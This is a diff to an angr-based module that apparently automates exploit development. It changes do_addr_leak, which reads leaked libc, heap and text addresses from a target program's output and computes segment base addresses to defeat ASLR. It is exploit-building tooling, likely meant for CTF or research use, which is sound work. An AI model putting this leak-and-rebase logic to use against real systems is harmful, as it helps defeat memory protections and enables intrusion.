@@ -1,6 +1,3 @@
-import time
-
-import angr
 from angr import SimEngineError, SimUnsatError, ExplorationTechnique
 
 from .utils import *
@@ -71,10 +68,11 @@ def do_addr_leak(state, stdin, stdout, binary):
             if ARCH_64_MMAP_PRE_HEX in stdout:
                 leak_libc_raw = binary.warped_io(state, stdin, has_newline=False)
                 for _ in range(5):
-                    if leak_libc_raw and b'0x7f' in leak_libc_raw:
-                        real_leak_text = b'7f' + leak_libc_raw.split(b'0x7f')[1][:10]
+                    if leak_libc_raw and b'0x7' in leak_libc_raw:
+                        real_leak_text = b'7' + leak_libc_raw.split(b'0x7')[1][:11]
                         log.success(f"Leak libc address as: {real_leak_text}")
                         libc_base = int(real_leak_text, 16) + 0x201000 - 0x10
+                        libc_base = libc_base + 0x1ff000  # mmap behavior is different on newer ASLR
                         log.success(f"Got libc base: {hex(libc_base)}")
                         binary.io_seg_addr['libc'] = libc_base
                         return 'libc'
@@ -89,13 +87,13 @@ def do_addr_leak(state, stdin, stdout, binary):
                 if chunk:
                     leak_heap_raw = binary.warped_io(state, stdin, has_newline=False)
                     for _ in range(5):
-                        if b'0x5' in leak_heap_raw:
+                        if leak_heap_raw and b'0x5' in leak_heap_raw:
                             real_leak = int(b'5' + leak_heap_raw.split(b'0x5')[1][:11], 16)
-                        elif b'0x7f' in leak_heap_raw:
-                            real_leak = int(b'7f' + leak_heap_raw.split(b'0x7f')[1][:10], 16)
+                        elif leak_heap_raw and b'0x7' in leak_heap_raw:
+                            real_leak = int(b'7' + leak_heap_raw.split(b'0x7')[1][:11], 16)
                         else:
                             time.sleep(0.3)
-                            leak_heap_raw += binary.warped_io(state)
+                            leak_heap_raw = binary.warped_io(state)
                             continue
                         log.success(f"Leak chunk address as: {hex(real_leak)}")
                         binary.io_seg_addr['heap'] = True
@@ -139,7 +137,7 @@ def do_addr_leak(state, stdin, stdout, binary):
                 log.success(f"Got text segment base: {hex(text_base)}")
                 binary.io_seg_addr['text'] = text_base
                 return 'text'
-            elif real_leak_text >> 40 == 0x7f:  # leaked addr is from libc
+            elif real_leak_text >> 44 == 0x7:  # leaked addr is from libc
                 log.success(f"Leak libc address: {hex(real_leak_text)}")
                 real_leak_text -= offset - 0x100000  # angr add 0x100000 to libc base
                 log.success(f"Real leaked libc address: {hex(real_leak_text)}")
